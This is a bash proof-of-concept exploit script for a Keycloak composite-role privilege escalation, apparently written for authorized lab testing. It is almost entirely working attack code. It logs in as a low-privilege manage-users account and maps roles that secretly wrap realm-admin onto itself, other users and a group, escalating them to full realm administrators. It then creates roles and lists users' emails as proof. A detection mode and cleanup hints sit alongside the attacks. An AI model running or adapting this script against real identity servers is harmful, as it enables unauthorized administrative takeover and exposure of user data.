#!/usr/bin/env bash
#
# kc_composite_maprole_poc.sh
# PoC for the Keycloak composite-role map-role privilege escalation
# (CVE-2026-94000 variant — missed recursive admin-role walk in
#  RolePermissionsV2.canMapRole / RoleMapperResource / ClientRoleMappingsResource).
#
# A caller holding only `manage-users` can map a composite role whose NAME is
# ordinary but whose children include realm-management/realm-admin, escalating
# itself or any user/group to full realm-admin.
#
# Role IDs are resolved exactly the way a manage-users caller actually can:
# via the `.../role-mappings/{realm,clients}/available` endpoints (manage-users
# is denied GET /roles/{name} and GET /clients, but CAN read these). This keeps
# the PoC an honest, low-privilege attacker's-eye reproduction.
#
# AUTHORIZED LAB / PENTEST USE ONLY. Default target is localhost.
#
# Usage:
#   ./kc_composite_maprole_poc.sh check     # detect the vuln (reversible probe)
#   ./kc_composite_maprole_poc.sh setup     # (realm-admin) create the composite payloads
#   ./kc_composite_maprole_poc.sh exploit   # self-escalate limited-admin -> realm-admin
#   ./kc_composite_maprole_poc.sh attack-b  # nested composite onto bob
#   ./kc_composite_maprole_poc.sh attack-c  # client-role wrapper onto carol
#   ./kc_composite_maprole_poc.sh attack-d  # map wrapper onto a group w/ members
#   ./kc_composite_maprole_poc.sh all       # check + exploit + B/C/D
#
# Config via env (defaults match the lab bootstrap):
#   BASE, REALM, ATTACKER_USER, ATTACKER_PASS, ADMIN_USER, ADMIN_PASS, CLIENT_ID
#
set -euo pipefail

BASE="${BASE:-http://127.0.0.1:8080}"
REALM="${REALM:-app}"
CLIENT_ID="${CLIENT_ID:-admin-cli}"

# Low-priv attacker (manage-users only)
ATTACKER_USER="${ATTACKER_USER:-limited-admin}"
ATTACKER_PASS="${ATTACKER_PASS:-limitedpass}"

# True realm/master admin — only used by `setup`, and as an optional fallback to
# resolve a non-admin client's internal UUID for Attack C (see note there).
ADMIN_REALM="${ADMIN_REALM:-master}"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-admin}"

# Payload names
WRAPPER_ROLE="${WRAPPER_ROLE:-sneaky-composite}"
OUTER_ROLE="${OUTER_ROLE:-outer-sneaky}"
SPA_CLIENT="${SPA_CLIENT:-spa}"
SPA_ROLE="${SPA_ROLE:-hidden-ra}"
HELP_GROUP="${HELP_GROUP:-helpdesk}"

# Per-attack victims
BOB_USER="${BOB_USER:-bob}";     BOB_PASS="${BOB_PASS:-bobpass}"
CAROL_USER="${CAROL_USER:-carol}"; CAROL_PASS="${CAROL_PASS:-carolpass}"
ALICE_USER="${ALICE_USER:-alice}"; ALICE_PASS="${ALICE_PASS:-alicepass}"

# ---------- pretty output ----------
c_r=$'\033[31m'; c_g=$'\033[32m'; c_y=$'\033[33m'; c_b=$'\033[36m'; c_0=$'\033[0m'
ok()   { printf '%s[+]%s %s\n' "$c_g" "$c_0" "$*"; }
info() { printf '%s[*]%s %s\n' "$c_b" "$c_0" "$*"; }
warn() { printf '%s[!]%s %s\n' "$c_y" "$c_0" "$*"; }
err()  { printf '%s[-]%s %s\n' "$c_r" "$c_0" "$*" >&2; }
hr()   { printf '%s\n' "----------------------------------------------------------------"; }

need() { command -v "$1" >/dev/null 2>&1 || { err "missing dependency: $1"; exit 1; }; }
need curl; need jq

ADMIN_API="$BASE/admin/realms/$REALM"

# ---------- auth ----------
token() { # realm user pass
  curl -s -X POST "$BASE/realms/$1/protocol/openid-connect/token" \
    -d client_id="$CLIENT_ID" -d grant_type=password \
    -d username="$2" -d password="$3" | jq -r '.access_token // empty'
}

# ---------- http with status ----------
LAST_BODY=""
status() { # METHOD URL TOKEN [JSON]
  local method="$1" url="$2" tok="$3" data="${4:-}" tmp code
  tmp="$(mktemp)"
  if [ -n "$data" ]; then
    code=$(curl -s -o "$tmp" -w '%{http_code}' -X "$method" "$url" \
      -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -d "$data")
  else
    code=$(curl -s -o "$tmp" -w '%{http_code}' -X "$method" "$url" -H "Authorization: Bearer $tok")
  fi
  LAST_BODY="$(cat "$tmp")"; rm -f "$tmp"; printf '%s' "$code"
}
expect() { # desc METHOD URL TOKEN WANT_REGEX [JSON]
  local desc="$1" method="$2" url="$3" tok="$4" want="$5" data="${6:-}" code
  code=$(status "$method" "$url" "$tok" "$data")
  if [[ "$code" =~ $want ]]; then ok "$desc -> HTTP $code (want $want)"; return 0
  else err "$desc -> HTTP $code (want $want)"; [ -n "$LAST_BODY" ] && printf '    body: %s\n' "$(printf '%s' "$LAST_BODY" | head -c 200)"; return 1; fi
}

# ---------- attacker-visible lookups ----------
get() { curl -s -H "Authorization: Bearer $1" "$2"; }
user_id()  { get "$1" "$ADMIN_API/users?username=$2&exact=true" | jq -r '.[0].id // empty'; }
group_id() { get "$1" "$ADMIN_API/groups?search=$2" | jq -r --arg n "$2" '.[]|select(.name==$n)|.id' | head -n1; }

# Resolve a realm-role id the way manage-users can: the target's "available" list.
# subjpath is e.g. "users/<id>" or "groups/<id>".
avail_realm_role_id() { # token subjpath rolename
  get "$1" "$ADMIN_API/$2/role-mappings/realm/available" \
    | jq -r --arg n "$3" '.[]|select(.name==$n)|.id' | head -n1
}
avail_client_role_id() { # token subjpath clientUuid rolename
  get "$1" "$ADMIN_API/$2/role-mappings/clients/$3/available" \
    | jq -r --arg n "$4" '.[]|select(.name==$n)|.id' | head -n1
}

# manage-users cannot list clients (GET /clients -> 403), so a non-admin client's
# internal UUID is resolved via the admin token when available. In a real
# engagement the UUID is obtained out-of-band; the vuln under test is the MAP
# authorization, not client discovery.
resolve_client_uuid() { # clientId
  local u=""
  if [ -n "${ADMIN_PASS:-}" ]; then
    local at; at="$(token "$ADMIN_REALM" "$ADMIN_USER" "$ADMIN_PASS")"
    [ -n "$at" ] && u="$(get "$at" "$ADMIN_API/clients?clientId=$1" | jq -r '.[0].id // empty')"
  fi
  printf '%s' "$u"
}

banner() {
  hr; info "Target     : $BASE  (realm: $REALM)"
     info "Attacker   : $ATTACKER_USER (expected scope: manage-users)"; hr
}

# =====================================================================
# setup — plant payloads as a true admin (lab convenience; the Docker
#         bootstrap already does this)
# =====================================================================
cmd_setup() {
  banner; info "Authenticating as admin ($ADMIN_USER@$ADMIN_REALM)..."
  local AT; AT="$(token "$ADMIN_REALM" "$ADMIN_USER" "$ADMIN_PASS")"
  [ -n "$AT" ] || { err "admin auth failed"; exit 1; }
  local RM RA; RM="$(get "$AT" "$ADMIN_API/clients?clientId=realm-management" | jq -r '.[0].id')"
  RA="$(get "$AT" "$ADMIN_API/clients/$RM/roles/realm-admin" | jq -r '.id')"
  status POST "$ADMIN_API/roles" "$AT" "{\"name\":\"$WRAPPER_ROLE\"}" >/dev/null || true
  local S; S="$(get "$AT" "$ADMIN_API/roles/$WRAPPER_ROLE" | jq -r '.id')"
  status POST "$ADMIN_API/roles-by-id/$S/composites" "$AT" "[{\"id\":\"$RA\",\"name\":\"realm-admin\"}]" >/dev/null
  ok "wrapper '$WRAPPER_ROLE' -> realm-admin planted ($S)"
}

# =====================================================================
# check — reversible detection
# =====================================================================
cmd_check() {
  banner
  local T; T="$(token "$REALM" "$ATTACKER_USER" "$ATTACKER_PASS")"
  [ -n "$T" ] || { err "attacker auth failed"; exit 1; }
  ok "authenticated as $ATTACKER_USER"
  local me; me="$(user_id "$T" "$ATTACKER_USER")"

  info "Baseline: confirm attacker is genuinely low-priv (realm op should 403)"
  expect "POST /roles (should be denied)" POST "$ADMIN_API/roles" "$T" '^403$' '{"name":"probe-should-fail"}' || true

  info "Signal 1: is the composite wrapper in the attacker's mappable list?"
  local SNEAKY; SNEAKY="$(avail_realm_role_id "$T" "users/$me" "$WRAPPER_ROLE")"
  if [ -z "$SNEAKY" ]; then
    warn "wrapper '$WRAPPER_ROLE' not available to map — not present, or already assigned. Run setup/bootstrap."
    return 2
  fi
  ok "wrapper '$WRAPPER_ROLE' is listed as mappable by manage-users (id=$SNEAKY)"

  info "Signal 2 (decisive, reversible): map wrapper onto self, then UNMAP"
  local code; code=$(status POST "$ADMIN_API/users/$me/role-mappings/realm" "$T" "[{\"id\":\"$SNEAKY\",\"name\":\"$WRAPPER_ROLE\"}]")
  if [ "$code" = "204" ]; then
    status DELETE "$ADMIN_API/users/$me/role-mappings/realm" "$T" "[{\"id\":\"$SNEAKY\",\"name\":\"$WRAPPER_ROLE\"}]" >/dev/null || true
    hr; err "VULNERABLE: manage-users mapped a realm-admin-bearing composite (HTTP 204). Mapping rolled back."; return 0
  else
    hr; ok "NOT vulnerable on this path: map returned HTTP $code"; return 1
  fi
}

# =====================================================================
# exploit — Attack A: self-escalate
# =====================================================================
cmd_exploit() {
  banner
  local T; T="$(token "$REALM" "$ATTACKER_USER" "$ATTACKER_PASS")"
  [ -n "$T" ] || { err "attacker auth failed"; exit 1; }
  local me SNEAKY; me="$(user_id "$T" "$ATTACKER_USER")"; SNEAKY="$(avail_realm_role_id "$T" "users/$me" "$WRAPPER_ROLE")"
  [ -n "$SNEAKY" ] || { err "wrapper '$WRAPPER_ROLE' not mappable; run setup/bootstrap"; exit 1; }

  info "PRE-CHECK: attacker cannot create a realm role"
  expect "POST /roles as $ATTACKER_USER" POST "$ADMIN_API/roles" "$T" '^403$' '{"name":"pre-escalation-should-fail"}' || true

  info "ATTACK A: self-map composite '$WRAPPER_ROLE' (wraps realm-admin)"
  expect "map $WRAPPER_ROLE onto self" POST "$ADMIN_API/users/$me/role-mappings/realm" "$T" '^204$' \
    "[{\"id\":\"$SNEAKY\",\"name\":\"$WRAPPER_ROLE\"}]" || { err "escalation map failed — target likely patched"; exit 1; }

  info "Minting a fresh token (old JWT lacks the new roles)..."
  local T2; T2="$(token "$REALM" "$ATTACKER_USER" "$ATTACKER_PASS")"
  local marker="pwned-by-${ATTACKER_USER}-$(date +%s)"
  info "POST-CHECK: same attacker, new token, now performs realm-admin ops"
  expect "create realm role '$marker'" POST "$ADMIN_API/roles" "$T2" '^201$' "{\"name\":\"$marker\"}" || true
  info "Enumerating realm users (confidentiality impact)..."
  get "$T2" "$ADMIN_API/users?max=50" | jq -r '.[] | "    - \(.username) <\(.email // "n/a")>"' 2>/dev/null | head -n 25 || true

  hr; err "ESCALATION CONFIRMED: $ATTACKER_USER (manage-users) is now realm-admin."
  warn "Cleanup: remove mapping + role:"
  printf '    curl -X DELETE "%s/users/%s/role-mappings/realm" -H "Authorization: Bearer <admin>" -H "Content-Type: application/json" -d '\''[{"id":"%s","name":"%s"}]'\''\n' "$ADMIN_API" "$me" "$SNEAKY" "$WRAPPER_ROLE"
  printf '    (and delete realm role: %s)\n' "$marker"
}

# =====================================================================
# attack-b — nested composite onto bob
# =====================================================================
cmd_attack_b() {
  banner
  local T; T="$(token "$REALM" "$ATTACKER_USER" "$ATTACKER_PASS")"
  local BOB OUTER; BOB="$(user_id "$T" "$BOB_USER")"; OUTER="$(avail_realm_role_id "$T" "users/$BOB" "$OUTER_ROLE")"
  [ -n "$BOB" ] && [ -n "$OUTER" ] || { err "need user '$BOB_USER' and mappable role '$OUTER_ROLE'"; return 1; }

  info "ATTACK B: map nested wrapper '$OUTER_ROLE' (->$WRAPPER_ROLE->realm-admin) onto $BOB_USER"
  expect "map $OUTER_ROLE onto $BOB_USER" POST "$ADMIN_API/users/$BOB/role-mappings/realm" "$T" '^204$' \
    "[{\"id\":\"$OUTER\",\"name\":\"$OUTER_ROLE\"}]" || return 1
  local BT; BT="$(token "$REALM" "$BOB_USER" "$BOB_PASS")"
  expect "$BOB_USER creates a realm role (now admin)" POST "$ADMIN_API/roles" "$BT" '^201$' "{\"name\":\"pwned-by-${BOB_USER}-nested-$(date +%s)\"}" || true
  ok "nested composite escalation works — depth is not checked"
}

# =====================================================================
# attack-c — client-role wrapper on a non-admin client onto carol
# =====================================================================
cmd_attack_c() {
  banner
  local T; T="$(token "$REALM" "$ATTACKER_USER" "$ATTACKER_PASS")"
  local CAROL SPA HID; CAROL="$(user_id "$T" "$CAROL_USER")"; SPA="$(resolve_client_uuid "$SPA_CLIENT")"
  [ -n "$SPA" ] || { err "could not resolve '$SPA_CLIENT' UUID (set ADMIN_PASS, or export SPA_UUID)"; return 1; }
  HID="$(avail_client_role_id "$T" "users/$CAROL" "$SPA" "$SPA_ROLE")"
  [ -n "$CAROL" ] && [ -n "$HID" ] || { err "need user '$CAROL_USER' and mappable client role '$SPA_CLIENT/$SPA_ROLE'"; return 1; }

  info "PRE: $CAROL_USER cannot create roles"
  local CP; CP="$(token "$REALM" "$CAROL_USER" "$CAROL_PASS")"
  expect "$CAROL_USER POST /roles (pre)" POST "$ADMIN_API/roles" "$CP" '^403$' '{"name":"carol-pre"}' || true

  info "ATTACK C: map client role '$SPA_CLIENT/$SPA_ROLE' (wraps realm-admin) onto $CAROL_USER"
  expect "map $SPA_CLIENT/$SPA_ROLE onto $CAROL_USER" POST "$ADMIN_API/users/$CAROL/role-mappings/clients/$SPA" "$T" '^204$' \
    "[{\"id\":\"$HID\",\"name\":\"$SPA_ROLE\"}]" || return 1
  local CT; CT="$(token "$REALM" "$CAROL_USER" "$CAROL_PASS")"
  expect "$CAROL_USER creates a realm role (now admin)" POST "$ADMIN_API/roles" "$CT" '^201$' "{\"name\":\"pwned-by-${CAROL_USER}-clientrole-$(date +%s)\"}" || true
  ok "client-role wrapper on a non-admin client escalates — name outside ALL_ROLES is enough"
}

# =====================================================================
# attack-d — map wrapper onto a group that already has members
# =====================================================================
cmd_attack_d() {
  banner
  local T; T="$(token "$REALM" "$ATTACKER_USER" "$ATTACKER_PASS")"
  local HELP SNEAKY; HELP="$(group_id "$T" "$HELP_GROUP")"; SNEAKY="$(avail_realm_role_id "$T" "groups/$HELP" "$WRAPPER_ROLE")"
  [ -n "$HELP" ] && [ -n "$SNEAKY" ] || { err "need group '$HELP_GROUP' and mappable role '$WRAPPER_ROLE'"; return 1; }

  info "PRE: existing member '$ALICE_USER' cannot create roles"
  local AP; AP="$(token "$REALM" "$ALICE_USER" "$ALICE_PASS")"
  expect "$ALICE_USER POST /roles (pre)" POST "$ADMIN_API/roles" "$AP" '^403$' '{"name":"alice-pre"}' || true

  info "ATTACK D: map wrapper '$WRAPPER_ROLE' onto group '$HELP_GROUP' (not a join)"
  expect "map $WRAPPER_ROLE onto group $HELP_GROUP" POST "$ADMIN_API/groups/$HELP/role-mappings/realm" "$T" '^204$' \
    "[{\"id\":\"$SNEAKY\",\"name\":\"$WRAPPER_ROLE\"}]" || return 1
  local AT2; AT2="$(token "$REALM" "$ALICE_USER" "$ALICE_PASS")"
  expect "$ALICE_USER (existing member) creates a realm role (now admin)" POST "$ADMIN_API/roles" "$AT2" '^201$' "{\"name\":\"pwned-by-${ALICE_USER}-via-group-$(date +%s)\"}" || true

  info "CONTROL: joining a NEW member still fails (the 26.8.1 fix is intact)"
  # Only meaningful while the attacker is still manage-users. If Attack A already
  # escalated this identity (e.g. during `all`), the join legitimately succeeds,
  # so detect and skip rather than print a misleading result.
  local priv; priv=$(status POST "$ADMIN_API/roles" "$T" "{\"name\":\"d-privprobe-$(date +%s)\"}")
  if [ "$priv" = "403" ]; then
    local BOB; BOB="$(user_id "$T" "$BOB_USER")"
    [ -n "$BOB" ] && expect "join $BOB_USER to $HELP_GROUP (should 403)" PUT "$ADMIN_API/users/$BOB/groups/$HELP" "$T" '^403$' || true
  else
    warn "attacker is already realm-admin (POST /roles=$priv) — join-control skipped; run 'attack-d' standalone on a fresh lab to see the 403."
  fi
  ok "every current member of a manageable group is escalated without any join"
}

usage() { sed -n '2,33p' "$0" | sed 's/^#\s\?//'; }

main() {
  case "${1:-}" in
    check)    cmd_check ;;
    setup)    cmd_setup ;;
    exploit|attack-a) cmd_exploit ;;
    attack-b) cmd_attack_b ;;
    attack-c) cmd_attack_c ;;
    attack-d) cmd_attack_d ;;
    all)      cmd_check || true; echo; cmd_exploit || true; echo; cmd_attack_b || true; echo; cmd_attack_c || true; echo; cmd_attack_d || true ;;
    ""|-h|--help|help) usage ;;
    *) err "unknown command: $1"; usage; exit 1 ;;
  esac
}
main "$@"
